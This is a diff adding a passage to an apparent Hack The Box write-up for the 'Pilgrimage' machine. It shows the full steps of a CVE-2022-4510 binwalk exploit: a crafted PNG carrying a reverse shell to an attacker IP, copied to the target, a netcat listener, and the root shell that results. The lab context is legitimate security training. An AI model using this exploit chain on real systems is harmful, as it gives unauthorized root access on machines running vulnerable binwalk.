@@ -231,3 +231,57 @@ Binwalk v2.3.2
 ```
 
 same scenario again, you just use the script to make a picture malicious, upload it to the box, and copy it to `/var/www/pilgrimage.htb/shrunk` and you’ll get a reverse shell as root
+
+```jsx
+### my machine
+$ python CVE-2022-4510.py
+...
+usage: CVE-2022-4510.py [-h] file ip port
+
+positional arguments:
+  file        Path to input .png file
+  ip          Ip to nc listener
+  port        Port to nc listener
+
+options:
+  -h, --help  show this help message and exit 
+$ python CVE-2022-4510.py the_council_decided_exile.jpg 10.10.14.119 10000
+
+...
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+
+$ ls
+binwalk_exploit.png  CVE-2022-4510.py  the_council_decided_exile.jpg
+$ scp binwalk_exploit.png emily@pilgrimage.htb:/tmp
+emily@pilgrimage.htb's password: 
+binwalk_exploit.png                                              100%   68KB  41.6KB/s   00:01
+$ nc -lnvp 10000
+
+### htb machine
+emily@pilgrimage:~$ ls /tmp/
+binwalk_exploit.png
+systemd-private-82c671d9f3154d60bd6496cae4bfdb5f-systemd-logind.service-eBKEJg
+systemd-private-82c671d9f3154d60bd6496cae4bfdb5f-systemd-timesyncd.service-IzHsGf
+vmware-root_606-2722828934
+emily@pilgrimage:~$ cp /tmp/binwalk_exploit.png /var/www/pilgrimage.htb/shrunk
+emily@pilgrimage:~$
+
+### my machine
+
+$ nc -lnvp 10000
+Connection from 10.10.11.219:48518
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@pilgrimage:~/quarantine# pwd
+pwd
+/root/quarantine
+root@pilgrimage:~/quarantine# cd ..
+cd ..
+root@pilgrimage:~# ls
+ls
+quarantine  reset.sh  root.txt
+root@pilgrimage:~# cat root.txt
+cat root.txt
+[REDACTED]
+root@pilgrimage:~#
+```
